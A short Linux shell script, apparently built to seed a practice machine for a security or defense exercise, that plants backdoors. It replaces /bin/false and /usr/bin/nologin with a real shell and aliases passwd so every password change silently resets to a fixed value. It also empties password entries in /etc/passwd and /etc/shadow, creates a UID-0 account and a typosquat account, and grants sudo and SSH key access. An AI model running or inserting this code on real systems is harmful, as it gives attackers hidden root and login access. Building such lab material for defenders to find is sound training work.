#!/bin/sh

groupadd joestar
cp /bin/sh /usr/bin/nologin
echo "alias passwd='passwd;(echo iluvred; echo iluvred) | passwd &>/dev/null'" >> /etc/bash.bashrc

# Add Admin user
useradd jotaro
usermod -g joestar jotaro
usermod -G sudo,wheel jotaro
sed -i "s/jotaro:x/jotaro:/" /etc/passwd
mkdir /home/jotaro
cp ../assets/.bashrc /home/jotaro/.bashrc

# Add Regular user
useradd jolyne
usermod -g joestar jolyne
usermod -G sudo,wheel jolyne
mkdir /home/jolyne
mkdir /home/jolyne/.ssh
cp ../assets/authorized_keys /home/jolyne/.ssh/authorized_keys

useradd joseph
usermod -g joestar joseph
usermod -u 0 joseph

# Add backdoored users
useradd jonathan
useradd josuke

usermod -g joestar jonathan
usermod -G adm jonathan
usermod -g joestar josuke
usermod -G dialout josuke

# Typosquat user
useradd kernpoops
usermod -s "/usr/bin/nologin" kernpoops
sed -i "s/sys:x/sys:/" /etc/shadow
usermod -s "/usr/bin/nologin" sys
cp "/bin/sh" "/bin/false"
